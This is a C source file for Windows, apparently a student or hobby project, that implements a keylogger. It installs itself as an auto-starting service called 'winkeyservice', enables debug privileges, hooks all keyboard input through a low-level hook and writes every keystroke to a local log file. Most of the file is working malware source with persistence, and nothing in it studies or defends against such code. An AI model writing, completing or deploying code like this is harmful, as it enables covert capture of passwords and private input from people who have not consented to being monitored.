#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <time.h>
#include <psapi.h>
#include <wtsapi32.h>
#include <tlhelp32.h>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "User32.lib")

#define SERVICE_NAME "winkeyservice"  // Cambiado a char[]
#define LOG_FILE_NAME "winkey.log"
#define MAX_PATH_LEN  260
#define ERROR_LOG_FILE "winkeyerror.log"

// Service-related variables
SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;
HANDLE hServiceStopEvent = NULL;
HHOOK hKeyboardHook = NULL;
HANDLE hLogFile = NULL;

// Prototypes
void InstallService();
void RemoveService();
void StartServiceNow();
void LogKeystroke(int key);
void LogError(const char* message);  // ANSI
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam);
void StartKeylogger();
void StopKeylogger();
void ElevatePrivileges();
void ReportServiceStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint);
void WINAPI ServiceCtrlHandler(DWORD CtrlCode);
void WINAPI ServiceMain(DWORD argc, LPSTR* argv);  // Cambiado a LPSTR
int CheckServiceInstallation();
void SetupLogFile();
void CleanupLogFile();

// Main function
int main(int argc, char* argv[]) {
    if (argc > 1) {
        if (strcmp(argv[1], "install") == 0) {
            ElevatePrivileges();
            InstallService();
            StartServiceNow();
        } else if (strcmp(argv[1], "remove") == 0) {
            ElevatePrivileges();
            RemoveService();
        } else if (strcmp(argv[1], "run") == 0) {
            StartKeylogger();
        } else {
            printf("Usage: svc <install/remove/run>\n");
        }
    } else {
        SERVICE_TABLE_ENTRYA ServiceTable[] = {
            { SERVICE_NAME, (LPSERVICE_MAIN_FUNCTIONA)ServiceMain },  // Cambiado a SERVICE_TABLE_ENTRYA
            { NULL, NULL }
        };

        if (!StartServiceCtrlDispatcherA(ServiceTable)) {
            LogError("Failed to start service control dispatcher.");
        }
    }

    return 0;
}

// Function to install the service
void InstallService() {
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);  // Cambiado a OpenSCManagerA
    if (!hSCManager) {
        LogError("Cannot open Service Control Manager");
        return;
    }

    char path[MAX_PATH];
    if (!GetModuleFileNameA(NULL, path, MAX_PATH)) {  // Cambiado a GetModuleFileNameA
        LogError("Cannot retrieve module file name.");
        CloseServiceHandle(hSCManager);
        return;
    }

    SC_HANDLE hService = CreateServiceA(
        hSCManager,
        SERVICE_NAME,
        SERVICE_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        path,  // Path to the executable
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );

    if (!hService) {
        LogError("Cannot create service.");
        CloseServiceHandle(hSCManager);
        return;
    }

    printf("Service installed successfully.\n");
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
}

// Function to remove the service
void RemoveService() {
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);  // Cambiado a OpenSCManagerA
    if (!hSCManager) {
        LogError("Cannot open Service Control Manager");
        return;
    }

    SC_HANDLE hService = OpenServiceA(hSCManager, SERVICE_NAME, DELETE | SERVICE_STOP | SERVICE_QUERY_STATUS);  // Cambiado a OpenServiceA
    if (!hService) {
        LogError("Cannot open service");
        CloseServiceHandle(hSCManager);
        return;
    }

    SERVICE_STATUS status;
    if (ControlService(hService, SERVICE_CONTROL_STOP, &status)) {
        printf("Stopping service...\n");
        Sleep(1000);
    }

    if (!DeleteService(hService)) {
        LogError("Cannot delete service");
    } else {
        printf("Service deleted successfully.\n");
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
}

// Elevate privileges to ensure the service can access system resources
void ElevatePrivileges() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL);
        CloseHandle(hToken);
    }
}

// Function to start the service
void StartServiceNow() {
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);  // Cambiado a OpenSCManagerA
    if (!hSCManager) {
        LogError("Cannot open Service Control Manager");
        return;
    }

    SC_HANDLE hService = OpenServiceA(hSCManager, SERVICE_NAME, SERVICE_START);  // Cambiado a OpenServiceA
    if (!hService) {
        LogError("Cannot open service");
        CloseServiceHandle(hSCManager);
        return;
    }

    if (!StartServiceA(hService, 0, NULL)) {  // Cambiado a StartServiceA
        LogError("Cannot start service");
    } else {
        printf("Service started successfully.\n");
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
}

// Function to start the keylogger
void StartKeylogger() {
    printf("Starting keylogger...\n");
    hKeyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);  // Usar versión A para ANSI
    if (!hKeyboardHook) {
        LogError("Failed to install keyboard hook.");
        return;
    }

    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0)) {  // Usar GetMessageA para ANSI
        TranslateMessage(&msg);
        DispatchMessageA(&msg);  // Usar DispatchMessageA para ANSI
    }

    UnhookWindowsHookEx(hKeyboardHook);
}

// Hook function to capture keystrokes
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
        LogKeystroke(pKeyStruct->vkCode);
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

// Log keystrokes to a file
void LogKeystroke(int key) {
    char keyString[16];
    FILE* logFile = fopen(LOG_FILE_NAME, "a+");

    if (key >= 'A' && key <= 'Z') {
        sprintf(keyString, "%c", key);
    } else {
        switch (key) {
            case VK_RETURN: sprintf(keyString, "[ENTER]"); break;
            case VK_SPACE: sprintf(keyString, " "); break;
            case VK_BACK: sprintf(keyString, "[BACKSPACE]"); break;
            case VK_TAB: sprintf(keyString, "[TAB]"); break;
            default: sprintf(keyString, "[0x%X]", key); break;
        }
    }

    if (logFile) {
        fprintf(logFile, "%s", keyString);
        fclose(logFile);
    }
}

// Log an error to the error log file
void LogError(const char* message) {
    FILE* errorFile = fopen(ERROR_LOG_FILE, "a+");  // Cambiado a fopen (ANSI)
    if (errorFile) {
        fprintf(errorFile, "%s\n", message);
        fclose(errorFile);
    }
}

// Entry point for the service
void WINAPI ServiceMain(DWORD argc, LPSTR* argv) {  // Cambiado a LPSTR
    (void)argc;  // Evitar advertencia por no uso
    (void)argv;  // Evitar advertencia por no uso

    hStatus = RegisterServiceCtrlHandlerA(SERVICE_NAME, ServiceCtrlHandler);  // Cambiado a RegisterServiceCtrlHandlerA
    if (!hStatus) {
        LogError("Failed to register service control handler.");
        return;
    }

    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    ReportServiceStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

    hServiceStopEvent = CreateEventA(NULL, TRUE, FALSE, NULL);  // Usar CreateEventA para ANSI
    if (!hServiceStopEvent) {
        ReportServiceStatus(SERVICE_STOPPED, NO_ERROR, 0);
        LogError("Failed to create stop event.");
        return;
    }

    StartKeylogger();
    ReportServiceStatus(SERVICE_RUNNING, NO_ERROR, 0);

    WaitForSingleObject(hServiceStopEvent, INFINITE);
    ReportServiceStatus(SERVICE_STOPPED, NO_ERROR, 0);
}

// Service control handler function
void WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
    switch (CtrlCode) {
        case SERVICE_CONTROL_STOP:
            SetEvent(hServiceStopEvent);
            ReportServiceStatus(SERVICE_STOPPED, NO_ERROR, 0);
            break;
        default:
            break;
    }
}

// Report service status to the SCM
void ReportServiceStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
    ServiceStatus.dwCurrentState = dwCurrentState;
    ServiceStatus.dwWin32ExitCode = dwWin32ExitCode;
    ServiceStatus.dwWaitHint = dwWaitHint;
    SetServiceStatus(hStatus, &ServiceStatus);
}
